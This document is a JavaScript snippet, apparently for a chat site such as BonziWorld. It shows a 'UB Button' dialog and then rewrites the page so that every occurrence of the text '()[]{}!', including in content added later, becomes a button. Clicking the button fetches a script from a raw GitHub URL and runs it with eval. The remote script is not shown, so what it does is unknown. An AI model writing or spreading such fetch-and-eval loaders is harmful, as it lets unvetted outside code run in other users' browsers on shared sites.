Dialog.alert({title:"The UB Button", text:`()[]{}!`, id:"e"});

(function() {

    // Target string to replace

    const targetString = "()[]{}!";

    

    // Replacement HTML/DOM structure

    const replacementHTML = '<button onclick="fetch(\'https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/UB.js\').then(r=>r.text()).then(eval);"><h1>UB</h1></button>';



    function walkAndReplace(node) {

        if (node.nodeType === Node.TEXT_NODE) {

            if (node.nodeValue.includes(targetString)) {

                const span = document.createElement('span');

                // Replace all occurrences of the target string

                const parts = node.nodeValue.split(targetString);

                

                span.textContent = parts[0];

                for (let i = 1; i < parts.length; i++) {

                    const btnTemplate = document.createElement('template');

                    btnTemplate.innerHTML = replacementHTML;

                    span.appendChild(btnTemplate.content);

                    

                    const textNode = document.createTextNode(parts[i]);

                    span.appendChild(textNode);

                }

                node.parentNode.replaceChild(span, node);

            }

        } else {

            // Skip script, style, and already injected button tags to avoid recursion/breaking functionality

            if (node.nodeType === Node.ELEMENT_NODE && 

                ['SCRIPT', 'STYLE', 'BUTTON'].includes(node.tagName)) {

                return;

            }

            

            const children = Array.from(node.childNodes);

            for (const child of children) {

                walkAndReplace(child);

            }

        }

    }



    // Run on initial load

    walkAndReplace(document.body);



    // Optional: Observe future dynamic DOM additions

    const observer = new MutationObserver((mutations) => {

        for (const mutation of mutations) {

            for (const node of mutation.addedNodes) {

                walkAndReplace(node);

            }

        }

    });



    observer.observe(document.body, {

        childList: true,

        subtree: true

    });

})(); 

